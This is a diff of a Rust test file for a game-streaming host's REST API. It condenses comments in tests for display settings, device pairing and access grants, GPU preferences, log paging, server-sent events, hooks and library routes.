-/// The display-management GET surface (presets + effective + the enforced-axes list). READ-ONLY
-/// on purpose: `prefs()` is a process-global `OnceLock`, so a PUT here would clobber it and race
-/// other tests running in the same process. `keep_alive: forever` (gaming-rig) is now accepted
-/// (not rejected) — that acceptance is covered on-glass (`.116`) + by the pure `policy` tests, and
-/// the `forever` value is read off the surfaced preset below without writing.
+/// GET-only: `prefs()` is a process-global `OnceLock`, so a PUT would race other tests.
+/// `keep_alive: forever` is read off the gaming-rig preset without writing.
 #[tokio::test]
 async fn display_settings_surface() {
     let app = test_app(test_state(), None);
@@ -2030,7 +1865,6 @@ async fn display_settings_surface() {
         body["effective"]["keep_alive"].is_object(),
         "the effective policy is echoed"
     );
-    // gaming-rig surfaces keep_alive: forever (no longer rejected) — read it off the preset list.
     let gaming = presets
         .iter()
         .find(|p| p["id"] == "gaming-rig")
@@ -2045,22 +1879,19 @@ async fn display_settings_surface() {
         .iter()
         .filter_map(|v| v.as_str())
         .collect();
-    // All five axes are enforced now (Stages 0-5).
     assert!(enforced.contains(&"keep_alive"));
     assert!(enforced.contains(&"topology"));
     assert!(enforced.contains(&"mode_conflict"));
     assert!(enforced.contains(&"identity"));
     assert!(enforced.contains(&"layout"));
-    // The experimental DDC/CI + PnP-disable + EDID-lock axes are acted on (Windows
-    // exclusive-isolate path; edid_lock additionally needs an AMD driver to do anything).
+    // DDC/CI, PnP-disable, and EDID-lock are acted on (Windows exclusive-isolate;
+    // edid_lock additionally needs an AMD driver).
     assert!(enforced.contains(&"ddc_power_off"));
     assert!(enforced.contains(&"pnp_disable_monitors"));
     assert!(enforced.contains(&"edid_lock"));
 }
 
-/// The display state/release endpoints are wired + auth-gated. On the test host no backend has
-/// created a display (and non-Windows reports none), so `/state` is empty and `/release` is a
-/// no-op — the shapes + the "nothing to release" path, without touching any global owner.
+/// No backend has created a display here (non-Windows reports none): empty `/state`, no-op `/release`.
 #[tokio::test]
 async fn display_state_and_release_empty() {
     let app = test_app(test_state(), None);
@@ -2082,10 +1913,8 @@ async fn display_state_and_release_empty() {
     assert_eq!(body["released"], 0);
 }
 
-/// `/display/monitors` is wired, auth-gated, and — the point of the test — **always answers 200
-/// with a well-formed envelope**, including on a test host with no compositor to enumerate. The
-/// console renders a picker from this; an enumeration failure has to arrive as an `error` string
-/// next to an empty list, never as a 5xx that reads to the UI as "the host is broken".
+/// Always 200 with a well-formed envelope, even with no compositor. Enumeration failure is
+/// an `error` string beside an empty list, never a 5xx.
 #[tokio::test]
 async fn display_monitors_answers_even_with_no_compositor() {
     let app = test_app(test_state(), None);
@@ -2093,20 +1922,15 @@ async fn display_monitors_answers_even_with_no_compositor() {
     let (status, body) = send(&app, get_req("/api/v1/display/monitors")).await;
     assert_eq!(status, StatusCode::OK);
     assert!(body["monitors"].is_array(), "monitors is always an array");
-    // No compositor on the test host ⇒ either a clean empty list or an explained failure, never
-    // both empty AND silent about why.
     let listed = body["monitors"].as_array().map(|a| a.len()).unwrap_or(0);
-    // gamescope is nested: it owns no physical heads by construction, so "empty and silent" is the
-    // correct answer there, not an unexplained one. A dev box that has ever been in game mode keeps
-    // `gamescope-0` sockets in its runtime dir, so `detect()` resolves gamescope and this test would
-    // otherwise fail on the machine rather than on the code (found running the suite on .136).
+    // gamescope owns no physical heads, so empty-and-silent is correct. A leftover
+    // `gamescope-0` socket makes `detect()` resolve gamescope on a dev box that was in game mode.
     let nested = body["compositor"] == "gamescope";
     assert!(
         listed > 0 || !body["error"].is_null() || body["compositor"].is_null() || nested,
         "an empty list must carry an error, an absent compositor, or a nested one: {body}"
     );
-    // The pin is reported verbatim so the console can flag "pinned to a monitor you don't have";
-    // unset on the test host.
+    // Pin is reported so the console can flag a missing monitor; unset here.
     assert!(body["pinned"].is_null(), "no PUNKTFUNK_CAPTURE_MONITOR set");
 }
 
@@ -2122,14 +1946,12 @@ async fn native_pairing_arm_show_and_unpair() {
     );
     let app = test_app_native(test_state(), np.clone());
 
-    // Disarmed: enabled, not armed, no PIN.
     let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
     assert_eq!(s, StatusCode::OK);
     assert_eq!(b["enabled"], true);
     assert_eq!(b["armed"], false);
     assert!(b["pin"].is_null());
 
-    // Arm → a PIN appears and is readable via status.
     let (s, b) = send(
         &app,
         post_json(
@@ -2146,10 +1968,9 @@ async fn native_pairing_arm_show_and_unpair() {
     assert_eq!(b["pin"], pin);
     assert!(b["expires_in_secs"].as_u64().unwrap() <= 60);
 
-    // The QUIC side would read the same live PIN.
+    // QUIC reads the same live PIN.
     assert_eq!(np.current_pin().as_deref(), Some(pin.as_str()));
 
-    // Pair a client out-of-band, then it shows in the list + can be unpaired.
     np.add("Test Device", "abc123").unwrap();
     let (s, b) = send(&app, get_req("/api/v1/native/clients")).await;
     assert_eq!(s, StatusCode::OK);
@@ -2164,7 +1985,6 @@ async fn native_pairing_arm_show_and_unpair() {
         .unwrap();
     assert_eq!(send(&app, missing).await.0, StatusCode::NOT_FOUND);
 
-    // Disarm clears the window.
     let del = axum::http::Request::delete("/api/v1/native/pair")
         .body(Body::empty())
         .unwrap();
@@ -2173,8 +1993,6 @@ async fn native_pairing_arm_show_and_unpair() {
     assert_eq!(b["armed"], false);
 }
 
-/// The collection delete on the native plane: one call empties the trust store, and repeating it
-/// is a zero-count success rather than an error.
 #[tokio::test]
 async fn native_unpair_all_empties_the_trust_store() {
     let np = Arc::new(
@@ -2200,20 +2018,19 @@ async fn native_unpair_all_empties_the_trust_store() {
     assert_eq!(status, StatusCode::OK);
     assert_eq!(body["unpaired"], 2);
 
-    // Gone from both the API and the store behind it (one persisted write, not two).
+    // One persisted write, not two.
     let (_, body) = send(&app, get_req("/api/v1/native/clients")).await;
     assert_eq!(body, serde_json::json!([]));
     assert!(np.list().is_empty());
     assert!(!np.is_paired("aa11") && !np.is_paired("bb22"));
 
-    // Idempotent — unlike the single delete, which 404s on a fingerprint it cannot find.
+    // Idempotent; the single delete 404s a missing fingerprint.
     let (status, body) = send(&app, del_all()).await;
     assert_eq!(status, StatusCode::OK);
     assert_eq!(body["unpaired"], 0);
 }
 
-/// Without a native plane there is no trust store to empty — 503, matching every other
-/// `/native/*` route (and NOT a silent 200 that would tell the console it had unpaired something).
+/// No native plane → 503, matching every other `/native/*`. Not a 200 that claims an unpair.
 #[tokio::test]
 async fn native_unpair_all_without_a_native_host_is_unavailable() {
     let app = test_app(test_state(), None);
@@ -2235,12 +2052,10 @@ async fn pending_devices_approve_and_deny() {
     );
     let app = test_app_native(test_state(), np.clone());
 
-    // Empty queue.
     let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
     assert_eq!(s, StatusCode::OK);
     assert_eq!(b.as_array().unwrap().len(), 0);
 
-    // Two devices knock (what the QUIC gate records); they appear in the list.
     np.note_pending("Enrico's MacBook", "aa11", None);
     np.note_pending("device bb22cc33", "bb22", None);
     let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
@@ -2249,7 +2064,6 @@ async fn pending_devices_approve_and_deny() {
     let approve_id = b[0]["id"].as_u64().unwrap();
     let deny_id = b[1]["id"].as_u64().unwrap();
 
-    // Approve the first with an operator label → paired under that name, gone from pending.
     let (s, b) = send(
         &app,
         post_json(
@@ -2263,7 +2077,6 @@ async fn pending_devices_approve_and_deny() {
     assert_eq!(b["fingerprint"], "aa11");
     assert!(np.is_paired("AA11"), "approval pins the fingerprint");
 
-    // Deny the second → dropped, not paired; a re-deny is 404.
     let deny = post_json(
         &format!("/api/v1/native/pending/{deny_id}/deny"),
         serde_json::json!({}),
@@ -2280,7 +2093,7 @@ async fn pending_devices_approve_and_deny() {
     .await;
     assert_eq!(s, StatusCode::NOT_FOUND);
 
-    // Queue is empty again; approving a stale id is 404 (keep `{}` = device's own name).
+    // Empty `{}` keeps the device's own name; a stale id 404s.
     let (_, b) = send(&app, get_req("/api/v1/native/pending")).await;
     assert_eq!(b.as_array().unwrap().len(), 0);
     let (s, _) = send(
@@ -2298,7 +2111,7 @@ fn patch_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> 
         .unwrap()
 }
 
-/// Host wall clock, unix seconds — for asserting the relative-in/absolute-stored conversion.
+/// Host wall clock, unix seconds — relative-in / absolute-stored conversion.
 fn wall_now() -> i64 {
     std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
@@ -2306,9 +2119,8 @@ fn wall_now() -> i64 {
         .as_secs() as i64
 }
 
-/// The WP6 acceptance spine: PATCH a device's access → the list reflects it AND the device's
-/// live-session watch fires — plus the PATCH's partial semantics (each omitted half keeps its
-/// current value; `clear_expiry` makes access permanent) and the `access_level` derivation.
+/// Omitted PATCH halves keep their current value; `clear_expiry` makes access permanent.
+/// The live-session watch must fire on the same edit.
 #[tokio::test]
 async fn patch_native_access_reflects_in_list_and_fires_watch() {
     use punktfunk_core::quic::{GRANT_GAMEPAD, GRANT_POINTER};
@@ -2323,10 +2135,10 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
     let app = test_app_native(test_state(), np.clone());
 
     np.add("Living Room TV", "aa11").unwrap();
-    // What a live session holds at admission — the edit must reach it within one event.
+    // What a live session holds at admission; the edit must reach it within one event.
     let mut rx = np.subscribe("aa11");
 
-    // Guest preset: controller-only for 2 hours. Case-insensitive fingerprint, like DELETE.
+    // 7200 s = 2 hours. Fingerprint path is case-insensitive, like DELETE.
     let now = wall_now();
     let (s, b) = send(
         &app,
@@ -2346,13 +2158,11 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
     );
     assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");
 
-    // The list reflects the same record (one derivation, no drift).
     let (_, list) = send(&app, get_req("/api/v1/native/clients")).await;
     assert_eq!(list[0]["grants"], GRANT_GAMEPAD);
     assert_eq!(list[0]["access_level"], "controller");
     assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);
 
-    // The watch fired — a live session from aa11 saw the edit.
     assert!(rx.has_changed().unwrap(), "the access watch must fire");
     {
         let state = rx.borrow_and_update();
@@ -2361,7 +2171,6 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
         assert!(!state.revoked);
     }
 
-    // Partial: a new expiry alone keeps the grants.
     let (s, b) = send(
         &app,
         patch_json(
@@ -2375,7 +2184,7 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
     let short_deadline = b["expires_unix"].as_i64().unwrap();
     assert!(short_deadline < deadline, "the expiry did change");
 
-    // Partial: new grants alone keep the expiry — exactly, not re-derived.
+    // Omitted expiry keeps the stored deadline exactly, not re-derived.
     let (s, b) = send(
         &app,
         patch_json(
@@ -2392,7 +2201,6 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
         "omitted expiry keeps current"
     );
 
-    // `clear_expiry` makes it permanent; grants (still view) survive.
     let (s, b) = send(
         &app,
         patch_json(
@@ -2405,7 +2213,6 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
     assert!(b["expires_unix"].is_null(), "clear_expiry = permanent");
     assert_eq!(b["access_level"], "view");
 
-    // A mask that is no preset reads as `custom`.
     let (_, b) = send(
         &app,
         patch_json(
@@ -2417,9 +2224,8 @@ async fn patch_native_access_reflects_in_list_and_fires_watch() {
     assert_eq!(b["access_level"], "custom");
 }
 
-/// The PATCH's refusals: reserved grant bits and the expiry-field conflict are 400s that change
-/// nothing, an unknown fingerprint is a 404 (editing access is not a way to pair a device), and
-/// no native plane is the usual 503.
+/// Reserved bits and expiry-field conflict 400 without writing. Unknown fingerprint is 404
+/// (PATCH is not a pairing path). No native plane is 503.
 #[tokio::test]
 async fn patch_native_access_validates_and_404s() {
     use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
@@ -2436,7 +2242,6 @@ async fn patch_native_access_validates_and_404s() {
     let app = test_app_native(test_state(), np.clone());
     np.add("Deck", "bb22").unwrap();
 
-    // Reserved bits: 400, never silently cleared — and the record is untouched.
     let (s, b) = send(
         &app,
         patch_json(
@@ -2449,7 +2254,6 @@ async fn patch_native_access_validates_and_404s() {
     assert!(b["error"].as_str().unwrap().contains("reserved"));
     assert_eq!(np.list()[0].grants, None, "a 400 writes nothing");
 
-    // Conflicting expiry instructions: 400.
     let (s, b) = send(
         &app,
         patch_json(
@@ -2461,7 +2265,6 @@ async fn patch_native_access_validates_and_404s() {
     assert_eq!(s, StatusCode::BAD_REQUEST);
     assert!(b["error"].as_str().unwrap().contains("clear_expiry"));
 
-    // Unknown fingerprint: 404, and no record appears.
     let (s, _) = send(
         &app,
         patch_json(
@@ -2473,7 +2276,6 @@ async fn patch_native_access_validates_and_404s() {
     assert_eq!(s, StatusCode::NOT_FOUND);
     assert!(!np.is_paired("nope99"), "PATCH must never pair a device");
 
-    // No native plane: 503, like every other /native route.
     let plain = test_app(test_state(), None);
     let (s, _) = send(
         &plain,
@@ -2486,10 +2288,8 @@ async fn patch_native_access_validates_and_404s() {
     assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
 }
 
-/// Approve-with-access pins the operator's chosen mask (plan WP6 acceptance): the response is
-/// the stored record — grants, absolute expiry, stamped grant time — enforcement agrees, and a
-/// re-knock from that fingerprint surfaces the stored access in the pending list. A reserved-bit
-/// choice is refused WITHOUT consuming the pending entry.
+/// Approve pins the chosen mask. Reserved bits 400 without consuming the pending entry.
+/// A later re-knock surfaces the stored access.
 #[tokio::test]
 async fn approve_with_access_pins_the_chosen_mask() {
     use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
@@ -2506,14 +2306,12 @@ async fn approve_with_access_pins_the_chosen_mask() {
     );
     let app = test_app_native(test_state(), np.clone());
 
-    // A fresh (never-paired) knock carries no stored access for the dialog.
     np.note_pending("Guest Phone", "cc33", None);
     let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
     assert!(pend[0]["grants"].is_null());
     assert!(pend[0]["access_level"].is_null());
     let id = pend[0]["id"].as_u64().unwrap();
 
-    // Reserved bits: 400, and the knock is still there to approve properly.
     let (s, _) = send(
         &app,
         post_json(
@@ -2529,7 +2327,7 @@ async fn approve_with_access_pins_the_chosen_mask() {
     );
     assert!(!np.is_paired("cc33"));
 
-    // The guest preset: controller-only, 4 hours.
+    // 14400 s = 4 hours.
     let now = wall_now();
     let (s, b) = send(
         &app,
@@ -2546,10 +2344,9 @@ async fn approve_with_access_pins_the_chosen_mask() {
     let deadline = b["expires_unix"].as_i64().unwrap();
     assert!((now + 14400..=now + 14402).contains(&deadline));
     assert!(b["granted_unix"].as_i64().unwrap() >= now, "grant stamped");
-    // Enforcement agrees with the payload.
     assert_eq!(np.effective("cc33", now), Some(GRANT_GAMEPAD));
 
-    // A later re-knock (the expired-guest flow) shows the STORED access to the approve dialog.
+    // Re-knock surfaces the stored access for the approve dialog.
     np.note_pending("Guest Phone", "cc33", None);
     let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
     assert_eq!(pend[0]["grants"], GRANT_GAMEPAD);
@@ -2557,9 +2354,8 @@ async fn approve_with_access_pins_the_chosen_mask() {
     assert_eq!(pend[0]["expires_unix"].as_i64().unwrap(), deadline);
 }
 
-/// Arm-with-access: the armed window carries the operator's choice (relative expiry already made
-/// absolute) and the ceremony inherits it — while a reserved-bit choice is refused BEFORE a
-/// window opens.
+/// Armed window carries the choice with relative expiry already absolute. Reserved bits
+/// 400 before a window opens.
 #[tokio::test]
 async fn arm_with_access_ceremony_inherits_the_choice() {
     use punktfunk_core::quic::{GRANT_ALL, GRANT_GAMEPAD};
@@ -2573,7 +2369,6 @@ async fn arm_with_access_ceremony_inherits_the_choice() {
     );
     let app = test_app_native(test_state(), np.clone());
 
-    // Reserved bits: 400 and NO window — a rejected request must not leave pairing open.
     let (s, _) = send(
         &app,
         post_json(
@@ -2601,8 +2396,7 @@ async fn arm_with_access_ceremony_inherits_the_choice() {
     let deadline = carried.expires_unix.expect("absolute deadline");
     assert!((now + 3600..=now + 3602).contains(&deadline));
 
-    // The ceremony choke point consumes `armed_access()` (WP2) — pairing under it inherits the
-    // window's choice, which is then what enforcement sees.
+    // Ceremony consumes `armed_access()`; pairing under it inherits the window's choice.
     np.add_with_access("Guest Deck", "dd44", np.armed_access())
         .unwrap();
     assert_eq!(np.effective("dd44", now), Some(GRANT_GAMEPAD));
@@ -2611,9 +2405,7 @@ async fn arm_with_access_ceremony_inherits_the_choice() {
     assert_eq!(list[0]["expires_unix"].as_i64().unwrap(), deadline);
 }
 
-/// Back-compat: approve and arm WITHOUT the new access fields behave exactly as before grants
-/// existed — no explicit choice reaches the store (`None`), so a new device gets the legacy
-/// full/permanent record (all access fields absent) and the list derives `full`.
+/// Omit the access fields: store `None`, derive `full` (legacy permanent record).
 #[tokio::test]
 async fn approve_and_arm_without_access_fields_keep_todays_behavior() {
     let np = Arc::new(
@@ -2629,7 +2421,6 @@ async fn approve_and_arm_without_access_fields_keep_todays_behavior() {
     );
     let app = test_app_native(test_state(), np.clone());
 
-    // Arm with only the legacy fields → the window carries NO access choice.
     let (s, _) = send(
         &app,
         post_json(
@@ -2641,7 +2432,6 @@ async fn approve_and_arm_without_access_fields_keep_todays_behavior() {
     assert_eq!(s, StatusCode::OK);
     assert_eq!(np.armed_access(), None, "no fields = no choice");
 
-    // Approve with only a name → the stored record is the legacy full/permanent one.
     np.note_pending("Old Laptop", "ee55", None);
     let (_, pend) = send(&app, get_req("/api/v1/native/pending")).await;
     let id = pend[0]["id"].as_u64().unwrap();
@@ -2673,18 +2463,16 @@ async fn native_endpoints_report_disabled_without_native_host() {
     let (s, b) = send(&app, get_req("/api/v1/native/pair")).await;
     assert_eq!(s, StatusCode::OK);
     assert_eq!(b["enabled"], false);
-    // Arming a host that isn't running the native server is a 503.
     let (s, _) = send(
         &app,
         post_json("/api/v1/native/pair/arm", serde_json::json!({})),
     )
     .await;
     assert_eq!(s, StatusCode::SERVICE_UNAVAILABLE);
-    // Pending list reads as an empty array (like /native/clients), not a 503.
+    // Pending list is `[]`, not 503 (same as `/native/clients`).
     let (s, b) = send(&app, get_req("/api/v1/native/pending")).await;
     assert_eq!(s, StatusCode::OK);
     assert_eq!(b.as_array().unwrap().len(), 0);
-    // Approve/deny without a native host are 503.
     let (s, _) = send(
         &app,
         post_json("/api/v1/native/pending/0/approve", serde_json::json!({})),
@@ -2706,9 +2494,8 @@ fn put_json(path: &str, body: serde_json::Value) -> axum::http::Request<Body> {
         .unwrap()
 }
 
-/// The GPU endpoints: the inventory GET always answers (an empty list on a GPU-less box —
-/// the schema is platform-independent), and the preference PUT validates mode + gpu_id
-/// BEFORE touching the persisted store, so a bad request can never write.
+/// Inventory GET always answers (empty on a GPU-less box). Preference PUT validates
+/// mode + gpu_id before touching the store.
 #[tokio::test]
 async fn gpu_endpoints_list_and_validate() {
     let app = test_app(test_state(), None);
@@ -2717,15 +2504,13 @@ async fn gpu_endpoints_list_and_validate() {
     assert_eq!(s, StatusCode::OK);
     assert!(b["gpus"].is_array());
     assert!(b["mode"].is_string());
-    // The host.env encoder pin is part of the schema (null when nothing is pinned) — the
-    // console warns off it when a pin contradicts the selected GPU (the pin is overridden at
-    // session open, and without this field the selection would just look broken).
+    // `encoder_pin` is null when nothing is pinned; the console warns when a pin contradicts
+    // the selected GPU (the pin is overridden at session open).
     assert!(
         b.as_object().unwrap().contains_key("encoder_pin"),
         "listGpus must carry encoder_pin"
     );
 
-    // Unknown mode → 400.
     let (s, _) = send(
         &app,
         put_json(
@@ -2736,7 +2521,6 @@ async fn gpu_endpoints_list_and_validate() {
     .await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
 
-    // `manual` without a gpu_id → 400.
     let (s, _) = send(
         &app,
         put_json(
@@ -2747,7 +2531,6 @@ async fn gpu_endpoints_list_and_validate() {
     .await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
 
-    // `manual` with an id that is not a present GPU → 400 (the console only offers listed ids).
     let (s, _) = send(
         &app,
         put_json(
@@ -2763,10 +2546,8 @@ async fn gpu_endpoints_list_and_validate() {
 async fn logs_endpoint_pages_by_cursor() {
     let app = test_app(test_state(), None);
 
-    // The ring is a process-wide singleton — start from wherever its cursor currently is. Other
-    // tests in this binary legitimately log (e.g. the identity tests' adopt/migrate lines), so a
-    // page can carry THEIR entries interleaved with ours: assert on OUR markers within the page,
-    // never on the page being exactly ours (that raced once and failed the suite).
+    // Process-wide ring; other tests log into it. Assert on our markers inside the page,
+    // never that the page is exactly ours.
     let (s, json) = send(&app, get_req("/api/v1/logs")).await;
     assert_eq!(s, StatusCode::OK);
     let start = json["next"].as_u64().unwrap();
@@ -2794,8 +2575,7 @@ async fn logs_endpoint_pages_by_cursor() {
     );
     assert_eq!(json["dropped"], false);
 
-    // Nothing newer than the served cursor at the time we ask — the page may again carry a
-    // concurrent test's fresh entries, but never our (already-served) markers a second time.
+    // Concurrent tests may add entries; our already-served markers must not appear again.
     let (s, json) = send(&app, get_req(&format!("/api/v1/logs?after={next}"))).await;
     assert_eq!(s, StatusCode::OK);
     assert!(json["entries"]
@@ -2808,12 +2588,11 @@ async fn logs_endpoint_pages_by_cursor() {
 
 // ------------------------------------------------------------------ events (SSE)
 
-/// Serializes the events-route tests: they share the process-global event bus and the
-/// connection-cap counter, so the cap test must never 503 a concurrently running stream test.
+/// Serializes events-route tests: they share the process-global bus and the connection-cap
+/// counter, so the cap test must never 503 a concurrently running stream test.
 static EVENTS_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
 
-/// `get_req` + the default test bearer, pre-attached (these tests read streaming bodies
-/// directly instead of going through `send`).
+/// `get_req` plus the default bearer; these tests read streaming bodies instead of `send`.
 fn events_req(path: &str) -> axum::http::Request<Body> {
     let mut req = get_req(path);
     req.headers_mut().insert(
@@ -2823,7 +2602,6 @@ fn events_req(path: &str) -> axum::http::Request<Body> {
     req
 }
 
-/// The next SSE frame as text, or `None` when the stream ended / nothing arrived in time.
 async fn next_sse_chunk(body: &mut Body) -> Option<String> {
     match tokio::time::timeout(std::time::Duration::from_secs(5), body.frame()).await {
         Ok(Some(Ok(frame))) => frame
@@ -2834,7 +2612,6 @@ async fn next_sse_chunk(body: &mut Body) -> Option<String> {
     }
 }
 
-/// Every `data:` payload in accumulated SSE text, parsed as JSON.
 fn sse_data_events(text: &str) -> Vec<serde_json::Value> {
     text.lines()
         .filter_map(|l| l.strip_prefix("data: "))
@@ -2854,9 +2631,8 @@ async fn events_stream_requires_bearer() {
     assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
 }
 
-/// The full consumer contract on one route: ring catch-up, the server-side kind filter, the
-/// live tail on the same connection, `?since=`/`Last-Event-ID` resume, and the `dropped`
-/// marker for a cursor that fell off the ring.
+/// Ring catch-up, kind filter, live tail, `?since=` / `Last-Event-ID` resume, and `dropped`
+/// when the cursor fell off the ring.
 #[tokio::test]
 async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
     use crate::events::EventKind;
@@ -2865,7 +2641,6 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
     let uniq = format!("evt-{}-{:p}", std::process::id(), &0u8 as *const u8);
     let m1 = format!("{uniq}-one");
 
-    // Noise of a different kind (must be filtered out), then our marker.
     crate::events::emit(EventKind::DisplayReleased { count: 424_242 });
     crate::events::emit(EventKind::LibraryChanged { source: m1.clone() });
 
@@ -2886,7 +2661,7 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
         "content-type: {ctype}"
     );
 
-    // Catch-up must deliver m1 (other tests' library.changed events may interleave — scan).
+    // Catch-up must deliver m1; other tests' library.changed events may interleave — scan.
     let mut body = resp.into_body();
     let mut seen = String::new();
     while !seen.contains(&m1) {
@@ -2909,9 +2684,8 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
         .and_then(|e| e["seq"].as_u64())
         .expect("marker frame carries the full event JSON with its seq");
 
-    // Live tail on the SAME connection. If a concurrent test floods the broadcast channel the
-    // slow-consumer cut ends this stream — then the documented client move (reconnect with the
-    // last seen id) must deliver m2 instead, so follow it rather than flaking.
+    // Live tail on the same connection. If a concurrent flood cuts the slow consumer, reconnect
+    // with the last seen id (the documented client move) instead of flaking.
     let m2 = format!("{uniq}-two");
     crate::events::emit(EventKind::LibraryChanged { source: m2.clone() });
     let mut tail = String::new();
@@ -2937,7 +2711,6 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
     }
     drop(body);
 
-    // Resume from m1's seq: m2 is caught up, m1 is not.
     let resp = app
         .clone()
         .oneshot(events_req(&format!(
@@ -2956,7 +2729,7 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
     assert!(!resumed.contains(&m1), "since-cursor must exclude m1");
     drop(body);
 
-    // Last-Event-ID beats ?since (it is the newer cursor on an SSE auto-reconnect).
+    // Last-Event-ID beats `?since` (newer cursor on SSE auto-reconnect).
     let mut req = events_req("/api/v1/events?since=0&kinds=library.changed");
     req.headers_mut().insert(
         "last-event-id",
@@ -2974,8 +2747,7 @@ async fn events_stream_catch_up_filter_resume_tail_and_dropped() {
     assert!(!resumed.contains(&m1), "Last-Event-ID must exclude m1");
     drop(body);
 
-    // A cursor that fell off the ring gets the dropped marker first. Flood the ring past
-    // capacity, then resume from seq 1.
+    // 1100 > ring capacity; resume from seq 1 must get the dropped marker first.
     for _ in 0..1100 {
         crate::events::emit(EventKind::DisplayReleased { count: 1 });
     }
@@ -3017,10 +2789,8 @@ async fn events_stream_connection_cap() {
 
 // ------------------------------------------------------------------ hooks
 
-/// GET returns the (empty-when-unconfigured) config; PUT validation rejects structural errors
-/// with the reason. A *successful* PUT is deliberately not exercised through the route — it
-/// would write the developer's real config dir; persistence is unit-tested in `crate::hooks`
-/// against a temp path.
+/// GET shape + PUT validation. A successful PUT would write the real config dir;
+/// persistence is unit-tested in `crate::hooks` against a temp path.
 #[tokio::test]
 async fn hooks_get_shape_and_put_validation() {
     let app = test_app(test_state(), None);
@@ -3036,7 +2806,6 @@ async fn hooks_get_shape_and_put_validation() {
             .unwrap()
     };
 
-    // Structurally invalid: an entry with no action.
     let (s, json) = send(
         &app,
         put(serde_json::json!({"hooks": [{"on": "stream.started"}]})),
@@ -3048,7 +2817,6 @@ async fn hooks_get_shape_and_put_validation() {
         "error names the problem: {json}"
     );
 
-    // Non-http(s) webhook.
     let (s, _) = send(
         &app,
         put(serde_json::json!({"hooks": [{"on": "pairing.*", "webhook": "ftp://x"}]})),
@@ -3056,7 +2824,6 @@ async fn hooks_get_shape_and_put_validation() {
     .await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
 
-    // Wrong bearer → 401 (the hooks surface is admin-lane).
     let mut req = get_req("/api/v1/hooks");
     req.headers_mut().insert(
         axum::http::header::AUTHORIZATION,
@@ -3068,16 +2835,9 @@ async fn hooks_get_shape_and_put_validation() {
 
 // ------------------------------------------------------------------ library scanners
 
-/// The source list is plugin-shaped and read-only-safe; the toggle rejects unknown ids
-/// with 404. (A successful toggle PUT would write the developer's real
-/// `library-scanners.json`, so the write path is exercised only through the unknown-id
-/// rejection here — the settings round-trip itself is unit-tested in `library::scanners`
-/// against pure shapes.)
-///
-/// This used to assert that `steam` is present on every platform, which was the defining property
-/// while the scanners were compiled in. It is deliberately gone: the list is now derived entirely
-/// from what the operator has installed, so on a host with no library plugins it is legitimately
-/// empty. What replaces it is the invariant that outlives the built-ins — **every** row is a plugin.
+/// Toggle 404s unknown ids. A successful PUT would write `library-scanners.json` in the
+/// real config dir, so only the rejection path is exercised here. Every row is a plugin;
+/// an empty list is legitimate when no library plugins are installed.
 #[tokio::test]
 async fn library_scanner_list_and_unknown_toggle() {
     let app = test_app(test_state(), None);
@@ -3095,7 +2855,7 @@ async fn library_scanner_list_and_unknown_toggle() {
             && sc["enabled"].is_boolean()),
         "every source row must carry the shape the console renders: {json}"
     );
-    // `custom` is a store, never a source — the toggle surface must not offer it.
+    // `custom` is a store, never a source — the toggle must not offer it.
     assert!(scanners.iter().all(|sc| sc["id"] != "custom"));
 
     let (s, json) = send(
@@ -3115,15 +2875,9 @@ async fn library_scanner_list_and_unknown_toggle() {
     );
 }
 
-/// A library id is `<store>:<external_id>`, so the hide route's path segment CONTAINS A COLON —
-/// and for Heroic (`heroic:legendary:<hash>`) it contains two.
-///
-/// This is the one thing about the endpoint that could be silently wrong: if the router did not
-/// match, or split on the colon, the console's hide button would 404 against an id the host itself
-/// produced. Asserting "not 404" is the whole point, so the body is deliberately INVALID — that
-/// stops at the JSON layer with a 4xx and never reaches the handler, which would otherwise write
-/// `library-hidden.json` into the developer's real config dir (the same reason the toggle test
-/// above only exercises its rejection path).
+/// Library ids are `<store>:<external_id>` (Heroic has two colons). If the router split on
+/// `:`, hide would 404 an id the host produced. The body is invalid on purpose so we never
+/// write `library-hidden.json` into the real config dir.
 #[tokio::test]
 async fn hide_route_matches_ids_containing_colons() {
     let app = test_app(test_state(), None);
@@ -3151,8 +2905,7 @@ async fn hide_route_matches_ids_containing_colons() {
 
 // ------------------------------------------------------------------ library providers
 
-/// Provider reconcile validation (the write path itself is unit-tested in `library::custom`
-/// against pure functions — a successful PUT here would touch the developer's real catalog).
+/// Validation only; a successful PUT would touch the real catalog (`library::custom` covers writes).
 #[tokio::test]
 async fn provider_reconcile_validation() {
     let app = test_app(test_state(), None);
@@ -3163,14 +2916,12 @@ async fn provider_reconcile_validation() {
             .unwrap()
     };
 
-    // Reserved / malformed provider ids.
     let (s, json) = send(&app, put("manual", serde_json::json!([]))).await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
     assert!(json["error"].as_str().unwrap().contains("reserved"));
     let (s, _) = send(&app, put("Bad%2FName", serde_json::json!([]))).await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
 
-    // Payload rules: empty external_id, duplicate external_id.
